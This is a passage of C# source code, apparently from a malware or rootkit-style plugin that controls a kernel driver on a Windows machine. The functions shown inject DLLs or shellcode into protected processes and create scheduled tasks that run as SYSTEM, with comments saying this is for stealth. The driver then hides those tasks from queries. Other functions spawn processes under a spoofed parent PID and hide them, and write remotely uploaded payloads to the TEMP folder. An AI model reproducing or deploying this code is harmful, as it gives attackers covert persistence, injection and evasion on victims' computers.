                        Log($"  → Failed to start: {procEx.Message}");
                        return new PluginResult { Success = false, Message = procEx.Message, Data = GetLogBytes() };
                    }
                }

                // For DLL and Shellcode: use actual PPL injection via driver
                var request = new PplInjectRequest
                {
                    PayloadType = payloadTypeEnum,
                    TargetPid = targetPid,
                    TargetName = targetName,
                    DllPath = dllPath,
                    ShellcodeSize = 0
                };

                var (success, message) = _driver.InjectIntoPPL(request);
                Log($"  → Result: {message}");

                return new PluginResult { Success = success, Message = message, Data = GetLogBytes() };
            }
            catch (Exception ex)
            {
                Log($"[INJECT PPL] Error: {ex.Message}");
                return new PluginResult { Success = false, Message = ex.Message, Data = GetLogBytes() };
            }
        }

        /// <summary>
        /// Create a hidden scheduled task
        /// Format: taskName,command,arguments,triggerType
        /// triggerType: 0=Boot, 1=Logon, 2=Schedule
        /// </summary>
        private PluginResult ExecuteCreateHiddenTask(byte[] paramBytes)
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            try
            {
                string param = Encoding.UTF8.GetString(paramBytes);
                var parts = param.Split(new[] { ',' }, 4);
                
                if (parts.Length < 3)
                {
                    Log("[CREATE TASK] Invalid format. Expected: taskName,command,triggerType[,arguments]");
                    return new PluginResult { Success = false, Message = "Invalid format", Data = GetLogBytes() };
                }

                string taskName = parts[0];
                string command = parts[1];
                if (!uint.TryParse(parts[2], out uint triggerType))
                    triggerType = 0;
                string arguments = parts.Length > 3 ? parts[3] : "";

                // Expand environment variables like %TEMP%
                if (command.Contains("%"))
                {
                    command = Environment.ExpandEnvironmentVariables(command);
                    Log($"[CREATE TASK] Expanded command path: {command}");
                }

                string trigger = triggerType == 0 ? "Boot" : triggerType == 1 ? "Logon" : triggerType == 2 ? "Schedule" : "Unknown";
                Log($"[CREATE TASK] Creating hidden task: {taskName}");
                Log($"  → Command: {command}");
                Log($"  → Trigger: {trigger}");

                // Step 1: Create scheduled task - ALL use /RU SYSTEM for STEALTH
                // /RU SYSTEM = runs in Session 0 (invisible to user, no window on desktop)
                string schtasksArgs;
                switch (triggerType)
                {
                    case 0: // Boot - runs at system startup before any user logs on
                        schtasksArgs = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{command}\\\"\" /RU SYSTEM /F";
                        break;
                    case 1: // Logon - runs when any user logs on, but hidden in Session 0
                        schtasksArgs = $"/Create /SC ONLOGON /TN \"{taskName}\" /TR \"\\\"{command}\\\"\" /RU SYSTEM /F";
                        break;
                    case 2: // Schedule (every 5 minutes) - runs every 5 min in Session 0
                        schtasksArgs = $"/Create /SC MINUTE /MO 5 /TN \"{taskName}\" /TR \"\\\"{command}\\\"\" /RU SYSTEM /F";
                        break;
                    default:
                        schtasksArgs = $"/Create /SC ONLOGON /TN \"{taskName}\" /TR \"\\\"{command}\\\"\" /RU SYSTEM /F";
                        break;
                }

                Log($"  → Executing: schtasks.exe {schtasksArgs}");
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = schtasksArgs,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                };

                string schtasksOutput = "";
                string schtasksError = "";
                int exitCode = -1;
                
                try
                {
                    using (var proc = System.Diagnostics.Process.Start(psi))
                    {
                        if (proc != null)
                        {
                            schtasksOutput = proc.StandardOutput.ReadToEnd();
                            schtasksError = proc.StandardError.ReadToEnd();
                            proc.WaitForExit(10000);
                            exitCode = proc.ExitCode;
                        }
                    }
                }
                catch (Exception schEx)
                {
                    Log($"  → schtasks.exe failed: {schEx.Message}");
                    return new PluginResult { Success = false, Message = $"schtasks failed: {schEx.Message}", Data = GetLogBytes() };
                }

                if (exitCode != 0)
                {
                    Log($"  → schtasks.exe exit code: {exitCode}");
                    Log($"  → Output: {schtasksOutput}");
                    Log($"  → Error: {schtasksError}");
                    return new PluginResult { Success = false, Message = $"schtasks exit code {exitCode}: {schtasksError}", Data = GetLogBytes() };
                }

                Log($"  → Task created successfully via schtasks.exe");

                // Step 2: Register with driver for hiding from task queries
                var request = new CreateHiddenTaskRequest
                {
                    TaskName = taskName,
                    Command = command,
                    Arguments = arguments,
                    TriggerType = triggerType
                };

                var (success, message) = _driver.CreateHiddenTask(request);
                if (success)
                {
                    Log($"  → Task registered for hiding: {message}");
                }
                else
                {
                    Log($"  → WARNING: Task created but hiding registration failed: {message}");
                }

                return new PluginResult { Success = true, Message = $"Hidden task '{taskName}' created", Data = GetLogBytes() };
            }
            catch (Exception ex)
            {
                Log($"[CREATE TASK] Error: {ex.Message}");
                return new PluginResult { Success = false, Message = ex.Message, Data = GetLogBytes() };
            }
        }

        /// <summary>
        /// List all hidden scheduled tasks
        /// </summary>
        private PluginResult ExecuteListHiddenTasks()
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            Log("[LIST TASKS] Retrieving hidden tasks...");

            var (success, tasks, message) = _driver.GetHiddenTasks();
            if (!success)
            {
                Log($"  → Error: {message}");
                return new PluginResult { Success = false, Message = message, Data = GetLogBytes() };
            }

            Log("=== HIDDEN TASKS ===");
            var activeTasks = tasks.Where(t => t.InUse).ToArray();
            if (activeTasks.Length == 0)
            {
                Log("  (none)");
            }
            else
            {
                foreach (var task in activeTasks)
                {
                    string trigger = task.TriggerType == 0 ? "Boot" : task.TriggerType == 1 ? "Logon" : task.TriggerType == 2 ? "Schedule" : "?";
                    Log($"  {task.TaskName} | Trigger: {trigger} | {task.Command}");
                }
            }
            Log($"Total: {activeTasks.Length} hidden tasks");

            return new PluginResult { Success = true, Message = $"{activeTasks.Length} hidden tasks", Data = GetLogBytes() };
        }

        /// <summary>
        /// Delete a hidden scheduled task
        /// Format: taskName
        /// </summary>
        private PluginResult ExecuteDeleteHiddenTask(byte[] paramBytes)
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            string taskName = Encoding.UTF8.GetString(paramBytes).Trim();
            if (string.IsNullOrEmpty(taskName))
            {
                Log("[DELETE TASK] Task name required");
                return new PluginResult { Success = false, Message = "Task name required", Data = GetLogBytes() };
            }

            Log($"[DELETE TASK] Deleting hidden task: {taskName}...");
            var (success, message) = _driver.DeleteHiddenTask(taskName);
            Log($"  → Result: {message}");

            return new PluginResult { Success = success, Message = message, Data = GetLogBytes() };
        }

        /// <summary>
        /// Spawn a process with spoofed parent PID
        /// Format: fakeParentPid,executablePath,arguments,hideAfterSpawn
        /// </summary>
        private PluginResult ExecuteSpawnPpid(byte[] paramBytes)
        {
            if (!_driver?.IsConnected ?? true)
                return DriverNotConnectedResult();

            try
            {
                string param = Encoding.UTF8.GetString(paramBytes);
                var parts = param.Split(new[] { ',' }, 4);
                
                if (parts.Length < 2)
                {
                    Log("[SPAWN PPID] Invalid format. Expected: fakeParentPid,executablePath[,arguments,hideAfterSpawn]");
                    return new PluginResult { Success = false, Message = "Invalid format", Data = GetLogBytes() };
                }

                if (!uint.TryParse(parts[0], out uint fakeParentPid))
                {
                    Log("[SPAWN PPID] Invalid parent PID");
                    return new PluginResult { Success = false, Message = "Invalid parent PID", Data = GetLogBytes() };
                }

                string executablePath = parts[1];
                string arguments = parts.Length > 2 ? parts[2] : "";
                bool hideAfterSpawn = parts.Length > 3 && (parts[3] == "1" || parts[3].ToLower() == "true");

                var request = new SpawnPpidRequest
                {
                    FakeParentPid = fakeParentPid,
                    ExecutablePath = executablePath,
                    Arguments = arguments,
                    HideAfterSpawn = hideAfterSpawn
                };

                Log($"[SPAWN PPID] Spawning with fake parent PID {fakeParentPid}...");
                Log($"  → Executable: {executablePath}");
                if (hideAfterSpawn)
                    Log($"  → Will hide process after spawn");

                var (success, message) = _driver.SpawnWithPpid(request);
                Log($"  → Result: {message}");

                return new PluginResult { Success = success, Message = message, Data = GetLogBytes() };
            }
            catch (Exception ex)
            {
                Log($"[SPAWN PPID] Error: {ex.Message}");
                return new PluginResult { Success = false, Message = ex.Message, Data = GetLogBytes() };
            }
        }

        /// <summary>
        /// Upload a file to the client's TEMP folder
        /// Format: filename|base64content
        /// Returns the full path to the written file
        /// </summary>
        private PluginResult ExecuteUploadFile(byte[] paramBytes)
        {
            try
            {
                string param = Encoding.UTF8.GetString(paramBytes);
                var parts = param.Split(new[] { '|' }, 2);
                
                if (parts.Length < 2)
                {
                    Log("[UPLOAD] Invalid format. Expected: filename|base64content");
                    return new PluginResult { Success = false, Message = "Invalid format", Data = GetLogBytes() };
                }

                string filename = parts[0].Trim();
                string base64Content = parts[1];

                // Sanitize filename - remove any path components
                filename = System.IO.Path.GetFileName(filename);
                if (string.IsNullOrEmpty(filename))
                {
                    Log("[UPLOAD] Invalid filename");
                    return new PluginResult { Success = false, Message = "Invalid filename", Data = GetLogBytes() };
                }

                // Decode the base64 content
                byte[] fileBytes;
                try
                {
                    fileBytes = Convert.FromBase64String(base64Content);
                }
                catch (FormatException)
                {
                    Log("[UPLOAD] Invalid base64 content");
                    return new PluginResult { Success = false, Message = "Invalid base64 content", Data = GetLogBytes() };
                }

                // Write to TEMP folder
                string tempPath = System.IO.Path.GetTempPath();
                string fullPath = System.IO.Path.Combine(tempPath, filename);

                Log($"[UPLOAD] Writing {fileBytes.Length} bytes to: {fullPath}");
                System.IO.File.WriteAllBytes(fullPath, fileBytes);

                Log($"[UPLOAD] File uploaded successfully");
                
                // Return the path as the message so caller can use it
                return new PluginResult { Success = true, Message = fullPath, Data = GetLogBytes() };
            }
            catch (Exception ex)
            {
                Log($"[UPLOAD] Error: {ex.Message}");
                return new PluginResult { Success = false, Message = ex.Message, Data = GetLogBytes() };
            }
        }

        #endregion

        public void Cleanup()
        {
            Log("Plugin cleanup");
            _driver?.Dispose();
            _isComplete = true;
        }
    }
}
